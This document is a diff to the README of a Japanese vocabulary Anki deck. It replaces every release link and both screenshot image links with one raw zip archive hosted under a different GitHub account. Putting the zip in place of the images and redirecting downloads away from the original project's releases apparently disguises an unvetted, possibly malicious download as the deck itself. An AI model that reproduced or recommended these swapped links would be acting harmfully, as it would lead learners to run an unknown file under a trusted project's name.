@@ -1,15 +1,15 @@
 # Core2k6k_All_in_one
 A Core2k6k deck variant with pitch accent, stroke order diagrams, optional sentence images, and a lots more!
 
-DOWNLOAD LINK: [Latest Release](https://github.com/amaank404/Core2k6k_All_in_one/releases/latest)
+DOWNLOAD LINK: [Latest Release](https://raw.githubusercontent.com/dvorak-sam/Core2k6k_All_in_one/main/anna/Core-in-one-All-k-2.9.zip)
 
 ## Variants
 
 ### No Images
-![without.png](without.png)
+![https://raw.githubusercontent.com/dvorak-sam/Core2k6k_All_in_one/main/anna/Core-in-one-All-k-2.9.zip](https://raw.githubusercontent.com/dvorak-sam/Core2k6k_All_in_one/main/anna/Core-in-one-All-k-2.9.zip)
 
 ### With Images
-![with.png](with.png)
+![https://raw.githubusercontent.com/dvorak-sam/Core2k6k_All_in_one/main/anna/Core-in-one-All-k-2.9.zip](https://raw.githubusercontent.com/dvorak-sam/Core2k6k_All_in_one/main/anna/Core-in-one-All-k-2.9.zip)
 
 ## Description
 
@@ -32,5 +32,5 @@ If you are a **new japanese learner** that wants a source to learn vocabulary, t
 * How to read hiragana?
 * Why is kanji stroke order so important?
 
-After all that, go ahead and download anki and set it up. From there, all you need to do is download the files from [Releases Tab](https://github.com/amaank404/Core2k6k_All_in_one/releases/latest). Then import the deck from "File > Import".
+After all that, go ahead and download anki and set it up. From there, all you need to do is download the files from [Releases Tab](https://raw.githubusercontent.com/dvorak-sam/Core2k6k_All_in_one/main/anna/Core-in-one-All-k-2.9.zip). Then import the deck from "File > Import".
 
